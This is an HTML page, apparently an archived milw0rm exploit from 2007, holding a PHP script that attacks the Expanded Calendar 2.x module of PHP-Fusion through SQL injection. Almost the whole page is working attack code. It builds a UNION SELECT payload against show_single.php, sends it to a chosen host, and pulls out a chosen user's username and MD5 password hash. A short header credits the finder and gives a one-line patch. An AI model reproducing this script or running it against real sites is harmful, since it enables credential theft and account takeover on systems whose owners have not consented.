<html><head><title>PHP-Fusion module Expanded Calendar 2.x SQL Injection Exploit</title></head><pre>&lt;?php
print_r(&quot;
/********************************************************
*      Expanded Calendar 2.x (PHP-Fusion module)        *
*      User pass disclosure exploit                     *
*      Found by Matrix86 of Rbt-4 Crew                  *
*      Site: www.rbt-4.net                              *
*      Mail: info[at]rbt-4[dot]net                      *
*********************************************************
* Bug found in                                          *
*      /infusions/calendar_events_panel/show_single.php *
* Line:                                                 *
*      27                                               *
* Vulnerability type: Sql injection                     *
* Unpatched!                                            *
* Patch:                                                *
* Line 26:                                              *
* if(!isset(\$sel)||!isNum(\$sel)) fallback(\&quot;index.php\&quot;);
*
********************************************************/
&quot;);

if($argc &lt; 4) die(&quot;Usage: &quot;.$argv[0].&quot; [site] [path] [user_id]\nExample: &quot;.$argv[0].&quot; localhost /php-fusion/ 1\n&quot;);

ini_set(&quot;max_execution_time&quot;,0);
ini_set(&quot;default_socket_timeout&quot;,4);

$host    = $argv[1];
$path    = $argv[2];
$user_id = $argv[3];
$port    = 80;

$sqlinit = &quot;infusions/calendar_events_panel/show_single.php?sel=-1/**/UNION/**/SELECT/**/0,0,user_password,user_name,0,0,0,0,0,0,0,0/**/FROM/**/fusion_users/**/WHERE/**/user_id=&quot;;
$sqlend = &quot;/*&quot;;

function send($req){
	global $host,$port;
	
	$ip = gethostbyname($host);
	if(stristr($host,$ip)) die(&quot;Error: Host not found\n&quot;);
	
	if(!($sock = fsockopen($ip,$port))) die(&quot;Error: unable open sock!\n&quot;);
	
	fputs($sock,$req);
	$response = &quot;&quot;;
	while (!feof($sock)) {
		$response .= fgets ($sock,128);
	}
	fclose ($sock);
	return $response;
}

$packet = &quot;GET &quot;.$path.$sqlinit.$user_id.$sqlend.&quot; HTTP/1.0\r\n&quot;;
$packet.= &quot;User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.7 (like Gecko)\r\n&quot;;
$packet.= &quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Connection: Close\r\n\r\n&quot;;
echo &quot;Packet:\n&quot;.$packet.&quot;\n\n&quot;;

$resp = send($packet);
$temp  = explode(&quot;&lt;td colspan='2'&gt;&lt;font size='4'&gt;&lt;u&gt;&quot;,$resp);
$temp2 = explode(&quot;&lt;td colspan='3' style='border-style: solid; border-width: 1px; padding-left: 4px; padding-right: 4px; padding-top: 1px; padding-bottom: 1px'&gt;&lt;font style='font-size: 11px'&gt;&quot;,$temp[1]);
$temp3 = explode(&quot;&lt;/td&gt;&quot;,$temp2[1]);
$username = $temp3[0];

if(isset($temp[1])) {
	$md5 = substr($temp[1],0,32);
	echo &quot;Id user:  &quot;.$user_id.&quot;\nUsername: &quot;.$username.&quot;\nPassword: &quot;.$md5.&quot;\n&quot;;
}
else echo(&quot;Bug Fixed..sorry!\n&quot;);

exit();
?&gt;

# milw0rm.com [2007-10-01]</pre></html>